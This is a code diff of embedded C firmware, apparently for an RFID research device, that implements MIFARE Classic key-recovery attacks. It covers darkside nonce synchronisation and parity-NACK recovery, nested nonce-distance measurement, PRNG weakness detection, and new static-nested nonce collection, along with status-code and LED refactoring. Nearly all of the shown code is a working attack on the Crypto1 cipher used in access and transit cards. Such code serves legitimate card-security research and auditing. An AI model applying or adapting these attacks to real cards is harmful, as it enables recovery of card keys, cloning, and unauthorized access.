@@ -9,10 +9,13 @@
 #include "nrf_log.h"
 #include "nrf_log_ctrl.h"
 #include "nrf_log_default_backends.h"
-
+#include "bsp_wdt.h"
+#include "hw_connect.h"
+#include "nrf_gpio.h"
+#include "rgb_marquee.h"
 
 // The default delay of the antenna reset
-static uint32_t g_ant_reset_delay = 8;
+static uint32_t g_ant_reset_delay = 100;
 
 // Label information used for global operations
 static picc_14a_tag_t m_tag_info;
@@ -27,7 +30,7 @@ static picc_14a_tag_t *p_tag_info = &m_tag_info;
 * @retval   : none
 *
 */
-void nonce_distance_notable(uint32_t *msb, uint32_t *lsb) {
+static void nonce_distance(uint32_t *msb, uint32_t *lsb) {
     uint16_t x = 1, pos;
     uint8_t calc_ok = 0;
 
@@ -61,12 +64,12 @@ void nonce_distance_notable(uint32_t *msb, uint32_t *lsb) {
 *               false = hardened prng
 *
 */
-bool validate_prng_nonce_notable(uint32_t nonce) {
+static bool check_lfsr_prng(uint32_t nonce) {
     // Give the initial coordinate value
     uint32_t msb = nonce >> 16;
     uint32_t lsb = nonce & 0xffff;
     //The coordinates are passed in direct operation, and the rumors are also indirectly spread by the passing parameters.
-    nonce_distance_notable(&msb, &lsb);
+    nonce_distance(&msb, &lsb);
     return ((65535 - msb + lsb) % 65535) == 16;
 }
 
@@ -91,7 +94,7 @@ static inline void reset_radio_field_with_delay(void) {
 * @retval   : The length of the card response data, this length is the length of the bit, not the length of Byte
 *
 */
-uint8_t send_cmd(struct Crypto1State *pcs, uint8_t encrypted, uint8_t cmd, uint8_t data, uint8_t *status, uint8_t *answer, uint8_t *answer_parity, uint16_t answer_max_bit) {
+static uint8_t send_cmd(struct Crypto1State *pcs, uint8_t encrypted, uint8_t cmd, uint8_t data, uint8_t *status, uint8_t *answer, uint8_t *answer_parity, uint16_t answer_max_bit) {
     // Here we set directly to static
     static uint8_t pos;
     static uint16_t len;
@@ -256,7 +259,7 @@ int authex(struct Crypto1State *pcs, uint32_t uid, uint8_t blockNo, uint8_t keyT
 * As a result, the CPU cannot complete the replay attack within the same time.
 * There is basically no solution in this situation. It is recommended to close the non -critical interruption and task scheduling outside this code
 */
-uint8_t darkside_select_nonces(picc_14a_tag_t *tag, uint8_t block, uint8_t keytype, uint32_t *nt) {
+static uint8_t darkside_select_nonces(picc_14a_tag_t *tag, uint8_t block, uint8_t keytype, uint32_t *nt, mf1_darkside_status_t *darkside_status) {
 #define NT_COUNT 15
     uint8_t tag_auth[4]         = { keytype, block, 0x00, 0x00 };
     uint8_t tag_resp[4]         = { 0x00 };
@@ -269,6 +272,8 @@ uint8_t darkside_select_nonces(picc_14a_tag_t *tag, uint8_t block, uint8_t keyty
 
     //Random number collection
     for (i = 0; i < NT_COUNT; i++) {
+        bsp_wdt_feed();
+        while (NRF_LOG_PROCESS());
         //When the antenna is reset, we must make sure
         // 1. The antenna is powered off for a long time to ensure that the card is completely powered off, otherwise the pseudo -random number generator of the card cannot be reset
         // 2. Moderate power -off time, don't be too long, it will affect efficiency, and don't be too short.
@@ -287,7 +292,7 @@ uint8_t darkside_select_nonces(picc_14a_tag_t *tag, uint8_t block, uint8_t keyty
         // Converted to the type of U32 and cache
         nt_list[i] = bytes_to_num(tag_resp, 4);
         // The byte array of the conversion response is 10 in NT
-        // NRF_LOG_INFO("Get nt: %"PRIu32"\r\n", nt_list[i]);
+        // NRF_LOG_INFO("Get nt: %"PRIu32, nt_list[i]);
     }
 
     // Take the random number
@@ -315,12 +320,14 @@ uint8_t darkside_select_nonces(picc_14a_tag_t *tag, uint8_t block, uint8_t keyty
     // If it is not greater than 0, it means that the clock cannot be synchronized.
     if (max == 0) {
         NRF_LOG_INFO("Can't sync nt.\n");
-        return DARKSIDE_CANT_FIXED_NT;
+        *darkside_status = DARKSIDE_CANT_FIX_NT;
+        return HF_TAG_OK;
     }
 
     // NT is fixed successfully, the one with the highest number of times we take out
     // NRF_LOG_INFO("Sync nt: %"PRIu32", max = %d\n", nt_list[m], max);
     if (nt) *nt = nt_list[m];  // Only when the caller needs to get NT
+    *darkside_status = DARKSIDE_OK;
     return HF_TAG_OK;
 }
 
@@ -332,7 +339,8 @@ uint8_t darkside_select_nonces(picc_14a_tag_t *tag, uint8_t block, uint8_t keyty
 *
 */
 uint8_t darkside_recover_key(uint8_t targetBlk, uint8_t targetTyp,
-                             uint8_t firstRecover, uint8_t ntSyncMax, DarksideCore *dc) {
+                             uint8_t firstRecover, uint8_t ntSyncMax, DarksideCore_t *dc,
+                             mf1_darkside_status_t *darkside_status) {
 
     // Card information for fixed use
     static uint32_t uid_ori                 = 0;
@@ -363,7 +371,7 @@ uint8_t darkside_recover_key(uint8_t targetBlk, uint8_t targetTyp,
     uint8_t status                          = 0x00;  // This variable is responsible for saving card communication status
     uint16_t len                            = 0x00;  // This variable is responsible for saving the data of the card in the communication process to respond to the length of the card
     uint8_t nt_diff                         = 0x00;  // This variable is critical, don't initialize it, because the following is used directly
-
+    bool led_toggle                         = false;
     // We need to confirm the use of a certain card first
     if (pcd_14a_reader_scan_auto(p_tag_info) == HF_TAG_OK) {
         uid_cur = get_u32_tag_uid(p_tag_info);
@@ -373,6 +381,12 @@ uint8_t darkside_recover_key(uint8_t targetBlk, uint8_t targetTyp,
 
     // Verification instructions need to add CRC16
     crc_14a_append(tag_auth, 2);
+    rgb_marquee_stop();
+    set_slot_light_color(RGB_GREEN);
+    uint32_t *led_pins = hw_get_led_array();
+    for (uint8_t i = 0; i < RGB_LIST_NUM; i++) {
+        nrf_gpio_pin_clear(led_pins[i]);
+    }
 
     // Initialize the static variable if it is the first attack
     if (firstRecover) {
@@ -385,8 +399,8 @@ uint8_t darkside_recover_key(uint8_t targetBlk, uint8_t targetTyp,
         uid_ori = get_u32_tag_uid(p_tag_info);
 
         // Then you need to fix a random number that may appear
-        status = darkside_select_nonces(p_tag_info, targetBlk, targetTyp, &nt_ori);
-        if (status != HF_TAG_OK) {
+        status = darkside_select_nonces(p_tag_info, targetBlk, targetTyp, &nt_ori, darkside_status);
+        if ((status != HF_TAG_OK) || (*darkside_status != DARKSIDE_OK)) {
             //The fixed random number failed, and the next step cannot be performed
             return status;
         }
@@ -398,12 +412,21 @@ uint8_t darkside_recover_key(uint8_t targetBlk, uint8_t targetTyp,
         par = par_low;
 
         if (uid_ori != uid_cur) {
-            return DARKSIDE_TAG_CHANGED;
+            *darkside_status = DARKSIDE_TAG_CHANGED;
+            return HF_TAG_OK;
         }
     }
-
     // Always collect different NACK under a large cycle
     do {
+        bsp_wdt_feed();
+        while (NRF_LOG_PROCESS());
+        // update LEDs
+        led_toggle ^= 1;
+        if (led_toggle) {
+            nrf_gpio_pin_set(led_pins[nt_diff]);
+        } else {
+            nrf_gpio_pin_clear(led_pins[nt_diff]);
+        }
         // Reset the receiving sign of NACK
         received_nack = 0;
 
@@ -428,7 +451,7 @@ uint8_t darkside_recover_key(uint8_t targetBlk, uint8_t targetTyp,
 
         //The byte array of the conversion response is 10 in NT
         nt_cur = bytes_to_num(dat_recv, 4);
-        // NRF_LOG_INFO("Get nt: %"PRIu32"\r\n", nt_cur);
+        //NRF_LOG_INFO("Get nt: %"PRIu32, nt_cur);
 
         //Determine the clock synchronization (fixing NT)
         if (nt_cur != nt_ori) {
@@ -436,8 +459,9 @@ uint8_t darkside_recover_key(uint8_t targetBlk, uint8_t targetTyp,
             // And the random number we chose was also successfully attacked
             // In other words, this error has no chance to correct the random number
             if (++resync_count == ntSyncMax) {
-                NRF_LOG_INFO("Can't fix nonce.\r\n");
-                return DARKSIDE_CANT_FIXED_NT;
+                NRF_LOG_INFO("Can't fix nonce.");
+                *darkside_status = DARKSIDE_CANT_FIX_NT;
+                return HF_TAG_OK;
             }
 
             // When the clock is not synchronized, the following operation is meaningless
@@ -446,19 +470,20 @@ uint8_t darkside_recover_key(uint8_t targetBlk, uint8_t targetTyp,
             // NRF_LOG_INFO("Sync nt -> nt_fix: %"PRIu32", nt_new: %"PRIu32"\r\n", nt_ori, nt_cur);
             continue;
         }
-
         //Originally, we only need to send PAR, and use every bit of them as a school test.
         // But the sending function we implemented only supports one UINT8_T, that is, a byte as a bit
         // Therefore, we need to replace the communication writing of PM3 into our.
         // There are not many times here anyway, we directly expand the code for conversion
-        par_byte[0] = par >> 0 & 0x1;
-        par_byte[1] = par >> 1 & 0x1;
-        par_byte[2] = par >> 2 & 0x1;
-        par_byte[3] = par >> 3 & 0x1;
-        par_byte[4] = par >> 4 & 0x1;
-        par_byte[5] = par >> 5 & 0x1;
-        par_byte[6] = par >> 6 & 0x1;
-        par_byte[7] = par >> 7 & 0x1;
+        par_byte[0] = par >> 7 & 0x1;
+        par_byte[1] = par >> 6 & 0x1;
+        par_byte[2] = par >> 5 & 0x1;
+        par_byte[3] = par >> 4 & 0x1;
+        par_byte[4] = par >> 3 & 0x1;
+        par_byte[5] = par >> 2 & 0x1;
+        par_byte[6] = par >> 1 & 0x1;
+        par_byte[7] = par >> 0 & 0x1;
+
+        //NRF_LOG_INFO("DBG step%i par=%x", nt_diff, par);
 
         len = 0;
         pcd_14a_reader_bits_transfer(mf_nr_ar, 64, par_byte, dat_recv, par_byte, &len, U8ARR_BIT_LEN(dat_recv));
@@ -467,17 +492,19 @@ uint8_t darkside_recover_key(uint8_t targetBlk, uint8_t targetTyp,
         resync_count = 0;
 
         if (len == 4) {
-            // NRF_LOG_INFO("NACK get: 0x%x\r\n", receivedAnswer[0]);
+            NRF_LOG_INFO("NACK acquired (%i/8)", nt_diff + 1);
             received_nack = 1;
         } else if (len == 32) {
             // did we get lucky and got our dummy key to be valid?
             // however we dont feed key w uid it the prng..
             NRF_LOG_INFO("Auth Ok, you are so lucky!\n");
-            return DARKSIDE_LUCK_AUTH_OK;
+            *darkside_status = DARKSIDE_LUCKY_AUTH_OK;
+            return HF_TAG_OK;
         }
 
         // Receive answer. This will be a 4 Bit NACK when the 8 parity bits are OK after decoding
         if (received_nack) {
+            nrf_gpio_pin_set(led_pins[nt_diff]);
             if (nt_diff == 0) {
                 // there is no need to check all parities for other nt_diff. Parity Bits for mf_nr_ar[0..2] won't change
                 par_low = par & 0xE0;
@@ -500,11 +527,15 @@ uint8_t darkside_recover_key(uint8_t targetBlk, uint8_t targetTyp,
                 par++;
                 if (par == 0) {    // tried all 256 possible parities without success. Card doesn't send NACK.
                     NRF_LOG_INFO("Card doesn't send NACK.\r\n");
-                    return DARKSIDE_NACK_NO_SEND;
+                    *darkside_status = DARKSIDE_NO_NAK_SENT;
+                    return HF_TAG_OK;
                 }
             } else {
-                // Why this?
-                par = ((par & 0x1F) + 1) | par_low;
+                par = ((par + 1) & 0x1F) | par_low;
+                if (par == par_low) {    // tried all 32 possible parities without success. Got some NACK but not all 8...
+                    NRF_LOG_INFO("Card sent only %i/8 NACK.", nt_diff);
+                    return DARKSIDE_NO_NAK_SENT;
+                }
             }
         }
     } while (1);
@@ -522,6 +553,7 @@ uint8_t darkside_recover_key(uint8_t targetBlk, uint8_t targetTyp,
     memcpy(dc->ar, mf_nr_ar + 4, sizeof(dc->ar));
 
     // NRF_LOG_INFO("Darkside done!\n");
+    *darkside_status = DARKSIDE_OK;
     return HF_TAG_OK;
 }
 
@@ -535,23 +567,6 @@ uint8_t darkside_recover_key(uint8_t targetBlk, uint8_t targetTyp,
 */
 void antenna_switch_delay(uint32_t delay_ms) {
     g_ant_reset_delay = delay_ms;
-}
-
-/**
-* @brief    :Determine whether this card supports DARKSIDE attack
-* @retval   : If support, return hf_tag_ok, if it is not supported,
-* Return to the results of abnormal results during the detection process:
-*                   1. DARKSIDE_CANT_FIXED_NT
-*                   2. DARKSIDE_NACK_NO_SEND
-*                   3. DARKSIDE_TAG_CHANGED
-*              Or other card -related communication errors, the most common is loss card HF_TAG_NO
-*
-*/
-uint8_t check_darkside_support() {
-    // Instantiated parameter
-    DarksideCore dc;
-    //Determine and return the result directly
-    return darkside_recover_key(0x03, PICC_AUTHENT1A, true, 0x15, &dc);
 }
 
 /**
@@ -579,7 +594,7 @@ uint8_t check_tag_response_nt(picc_14a_tag_t *tag, uint32_t *nt) {
     // Send instructions and get NT return
     *nt = send_cmd(pcs, AUTH_FIRST, PICC_AUTHENT1A, 0x03, &status, dat_recv, par_recv, U8ARR_BIT_LEN(dat_recv));
     if (*nt != 32) {
-        // dbg_block_printf("No 32 data recv on send_cmd: %d\n", *nt);
+        // NRF_LOG_INFO("No 32 data recv on send_cmd: %d\n", *nt);
         return HF_ERR_STAT;
     }
     *nt = bytes_to_num(dat_recv, 4);
@@ -594,7 +609,7 @@ uint8_t check_tag_response_nt(picc_14a_tag_t *tag, uint32_t *nt) {
 * Lost card hf_tag_no and wrong status hf_errstat
 *
 */
-uint8_t check_std_mifare_nt_support() {
+uint8_t check_std_mifare_nt_support(void) {
     uint32_t nt1 = 0;
 
     // Find card, search on the field
@@ -602,7 +617,7 @@ uint8_t check_std_mifare_nt_support() {
         return HF_TAG_NO;
     }
 
-    // Get NT
+    // Get NT and return status
     return check_tag_response_nt(p_tag_info, &nt1);
 }
 
@@ -612,7 +627,7 @@ uint8_t check_std_mifare_nt_support() {
 * If support, return nested_tag_is_static, if not support,
 *
 */
-uint8_t check_static_nested_support() {
+uint8_t check_static_prng(bool *is_static) {
     uint32_t nt1, nt2;
     uint8_t status;
 
@@ -639,28 +654,30 @@ uint8_t check_static_nested_support() {
     }
 
     // Detect whether the random number is static
-    if (nt1 == nt2) {
-        return NESTED_TAG_IS_STATIC;
-    }
-
+    *is_static = (nt1 == nt2);
     return HF_TAG_OK;
 }
 
 /**
-* @brief    : Determine whether this card supports the most common, weaker, and easiest nested attack
+* @brief    : Determine whether this card supports the most common, weaker, and easiest nested attack, or static, or hardnested
 * @retval   : critical result
 *
 */
-uint8_t check_weak_nested_support() {
+uint8_t check_prng_type(mf1_prng_type_t *prng_type) {
     uint8_t status;
     uint32_t nt1;
 
-    status = check_static_nested_support();
+    bool is_static;
+    status = check_static_prng(&is_static);
 
     // If the judgment process is found, it is found that the StaticNested detection cannot be completed
     // Then return the state directly, no need to perform the following judgment logic.
     if (status != HF_TAG_OK) {
         return status;
+    }
+    if (is_static) {
+        *prng_type = PRNG_STATIC;
+        return HF_TAG_OK;
     }
 
     // Non -Static card, you can continue to run down logic
@@ -682,17 +699,19 @@ uint8_t check_weak_nested_support() {
     }
 
     //Calculate the effectiveness of NT
-    if (validate_prng_nonce_notable(nt1)) {
+    if (check_lfsr_prng(nt1)) {
         // NRF_LOG_INFO("The tag support Nested\n");
-        return HF_TAG_OK;
+        *prng_type = PRNG_WEAK;
+    } else {
+        // NRF_LOG_INFO("The tag support HardNested\n");
+        // NT is unpredictable and invalid.
+        *prng_type = PRNG_HARD;
     }
-    // NRF_LOG_INFO("The tag support HardNested\n");
-    // NT is unpredictable and invalid.
 
     // ------------------------------------
     // end
 
-    return NESTED_TAG_IS_HARD;
+    return HF_TAG_OK;
 }
 
 /**
@@ -702,12 +721,12 @@ uint8_t check_weak_nested_support() {
 * @retval   : Distance value
 *
 */
-uint32_t measure_nonces(uint32_t from, uint32_t to) {
+static uint32_t measure_nonces(uint32_t from, uint32_t to) {
     // Give the initial coordinate value
     uint32_t msb = from >> 16;
     uint32_t lsb = to >> 16;
     // The coordinates are passed in direct operation, and the rumors are also indirectly spread by the passing parameters.
-    nonce_distance_notable(&msb, &lsb);
+    nonce_distance(&msb, &lsb);
     return (65535 + lsb - msb) % 65535;
 }
 
@@ -753,7 +772,7 @@ uint32_t measure_median(uint32_t *src, uint32_t length) {
 * @retval   : Operating result
 *
 */
-uint8_t measure_distance(uint64_t u64Key, uint8_t block, uint8_t type, uint32_t *distance) {
+static uint8_t measure_distance(uint64_t u64Key, uint8_t block, uint8_t type, uint32_t *distance) {
     struct Crypto1State mpcs = {0, 0};
     struct Crypto1State *pcs = &mpcs;
     uint32_t distances[DIST_NR] = { 0x00 };
@@ -784,11 +803,12 @@ uint8_t measure_distance(uint64_t u64Key, uint8_t block, uint8_t type, uint32_t 
         // If you really encounter the same NT, then it can only be explained that this card is a ST card for special firmware
         if (nt1 == nt2) {
             NRF_LOG_INFO("StaticNested: %08x vs %08x\n", nt1, nt2);
-            return NESTED_TAG_IS_STATIC;
+            *distance = 0;
+            return HF_TAG_OK;
         }
         // After the measurement is completed, store in the buffer
         distances[index++] = measure_nonces(nt1, nt2);
-        // dbg_block_printf("dist = %"PRIu32"\n\n", distances[index - 1]);
+        // NRF_LOG_INFO("dist = %"PRIu32"\n\n", distances[index - 1]);
     } while (index < DIST_NR);
 
 //The final calculation of the distance between the two NTs and spread it directly
@@ -808,7 +828,7 @@ uint8_t measure_distance(uint64_t u64Key, uint8_t block, uint8_t type, uint32_t 
 * @retval   : Successfully return hf_tag_ok, verify the unsuccessful return of the non -hf_tag_ok value
 *
 */
-uint8_t nested_recover_core(NestedCore *pnc, uint64_t keyKnown, uint8_t blkKnown, uint8_t typKnown, uint8_t targetBlock, uint8_t targetType) {
+static uint8_t nested_recover_core(mf1_nested_core_t *pnc, uint64_t keyKnown, uint8_t blkKnown, uint8_t typKnown, uint8_t targetBlock, uint8_t targetType) {
     struct Crypto1State mpcs = {0, 0};
     struct Crypto1State *pcs = &mpcs;
     uint8_t status;
@@ -845,16 +865,16 @@ uint8_t nested_recover_core(NestedCore *pnc, uint64_t keyKnown, uint8_t blkKnown
 
 /**
 * @brief    :NESTED is implemented by default to collect random numbers of the sets_nr group. This function is only responsible for collecting, not responsible for conversion and analysis as KS
-* @param    :ncs         : Nested core structure array, save related communication data
 * @param    :keyKnown    : The U64 value of the known secret key of the card
 * @param    :blkKnown    :The owner of the known secret key of the card
 * @param    :typKnown    : Types of the known secret key of the card, 0x60 (A secret) or 0x61 (B secret)
 * @param    :targetBlock : The target sector that requires a Nested attack
 * @param    :targetType  : The target key type requires the Nested attack
-* @retval   :The attack returns hf_tag_ok, the attack is unsuccessful to return the non -hf_tag_ok value
+* @param    :ncs         : Nested core structure array, save related communication data
+* @retval   :The attack success return HF_TAG_OK, else return the error code
 *
 */
-uint8_t nested_recover_key(uint64_t keyKnown, uint8_t blkKnown, uint8_t typKnown, uint8_t targetBlock, uint8_t targetType, NestedCore ncs[SETS_NR]) {
+uint8_t nested_recover_key(uint64_t keyKnown, uint8_t blkKnown, uint8_t typKnown, uint8_t targetBlock, uint8_t targetType, mf1_nested_core_t ncs[SETS_NR]) {
     uint8_t m, res;
     // all operations must be based on the card
     res = pcd_14a_reader_scan_auto(p_tag_info);
@@ -887,29 +907,96 @@ uint8_t nested_recover_key(uint64_t keyKnown, uint8_t blkKnown, uint8_t typKnown
 * @retval   : Operating status value
 *
 */
-uint8_t nested_distance_detect(uint8_t block, uint8_t type, uint8_t *key, NestedDist *nd) {
+uint8_t nested_distance_detect(uint8_t block, uint8_t type, uint8_t *key, uint8_t *uid, uint32_t *distance) {
     uint8_t status      = HF_TAG_OK;
-    uint32_t distance   = 0;
+    *distance   = 0;
     //Must ensure that there is a card on the court
     status = pcd_14a_reader_scan_auto(p_tag_info);
     if (status != HF_TAG_OK) {
         return status;
     } else {
         // At least the card exists, you can copy the UID to the buffer first
-        get_4byte_tag_uid(p_tag_info, nd->uid);
+        get_4byte_tag_uid(p_tag_info, uid);
     }
     // Get distance, prepare for the next attack
-    status = measure_distance(
-                 bytes_to_num(key, 6),
-                 block,
-                 type,
-                 &distance
-             );
-    // Everything is normal, we need to put the distance value into the result
-    if (status == HF_TAG_OK) {
-        num_to_bytes(distance, 4, nd->distance);
+    return measure_distance(bytes_to_num(key, 6), block, type, distance);
+}
+
+/**
+* @brief    : StaticNested core, used to collect NT.
+*               This function is only responsible for collection and is not responsible for converting and parsing to KS.
+* @param    :p_nt1       : NT1, non encrypted.
+* @param    :p_nt2       : NT2, encrypted.
+* @param    :keyKnown    : U64 value of the known key of the card
+* @param    :blkKnown    : The sector to which the card's known secret key belongs
+* @param    :typKnown    : The known key type of the card, 0x60 (A key) or 0x61 (B key)
+* @param    :targetBlock : Target sectors that require nested attacks
+* @param    :targetType  : Target key types that require nested attacks
+* @param    :nestedAgain : StaticNested enhanced vulnerability, which can obtain two sets of encrypted random numbers based on nested verification of known keys
+* @retval   : Successfully collected and returned to HF_TAG_OK, otherwise an error code will be returned.
+*
+*/
+uint8_t static_nested_recover_core(uint8_t *p_nt1, uint8_t *p_nt2, uint64_t keyKnown, uint8_t blkKnown, uint8_t typKnown, uint8_t targetBlock, uint8_t targetType, uint8_t nestedAgain) {
+    struct Crypto1State mpcs = {0, 0};
+    struct Crypto1State *pcs = &mpcs;
+    uint8_t status, len;
+    uint8_t parity[4] = {0x00};
+    uint8_t answer[4] = {0x00};
+    uint32_t uid, nt1, nt2;
+    uid = get_u32_tag_uid(p_tag_info);
+    pcd_14a_reader_halt_tag();
+    if (pcd_14a_reader_scan_auto(p_tag_info) != HF_TAG_OK) {
+        return HF_TAG_NO;
     }
-    return status;
+    status = authex(pcs, uid, blkKnown, typKnown, keyKnown, AUTH_FIRST, &nt1);
+    if (status != HF_TAG_OK) {
+        return MF_ERR_AUTH;
+    }
+    if (nestedAgain) {
+        status = authex(pcs, uid, blkKnown, typKnown, keyKnown, AUTH_NESTED, NULL);
+        if (status != HF_TAG_OK) {
+            return MF_ERR_AUTH;
+        }
+    }
+    len = send_cmd(pcs, AUTH_NESTED, targetType, targetBlock, &status, answer, parity, U8ARR_BIT_LEN(answer));
+    if (len != 32) {
+        NRF_LOG_INFO("No 32 data recv on sendcmd: %d\r\n", len);
+        return HF_ERR_STAT;
+    }
+    nt2 = bytes_to_num(answer, 4);
+    num_to_bytes(nt1, 4, p_nt1);
+    num_to_bytes(nt2, 4, p_nt2);
+    return HF_TAG_OK;
+}
+
+/**
+* @brief    : StaticNested encapsulates and calls the functions implemented by the core to collect 2 sets of random numbers.
+*               This function is only responsible for collection and is not responsible for converting and parsing to KS.
+* @param    :keyKnown    : U64 value of the known key of the card
+* @param    :blkKnown    : The sector to which the card's known secret key belongs
+* @param    :typKnown    : The known key type of the card, 0x60 (A key) or 0x61 (B key)
+* @param    :targetBlock : Target sectors that require nested attacks
+* @param    :targetType  : Target key type that require nested attacks
+* @param    :sncs        : StaticNested Decrypting Core Structure Array
+* @retval   : Successfully collected and returned to HF_TAG_OK, otherwise an error code will be returned.
+*
+*/
+uint8_t static_nested_recover_key(uint64_t keyKnown, uint8_t blkKnown, uint8_t typKnown, uint8_t targetBlock, uint8_t targetType, mf1_static_nested_core_t *sncs) {
+    uint8_t res;
+    res = pcd_14a_reader_scan_auto(p_tag_info);
+    if (res != HF_TAG_OK) {
+        return res;
+    }
+    get_4byte_tag_uid(p_tag_info, sncs->uid);
+    res = static_nested_recover_core(sncs->core[0].nt1, sncs->core[0].nt2, keyKnown, blkKnown, typKnown, targetBlock, targetType, false);
+    if (res != HF_TAG_OK) {
+        return res;
+    }
+    res = static_nested_recover_core(sncs->core[1].nt1, sncs->core[1].nt2, keyKnown, blkKnown, typKnown, targetBlock, targetType, true);
+    if (res != HF_TAG_OK) {
+        return res;
+    }
+    return HF_TAG_OK;
 }
 
 /**
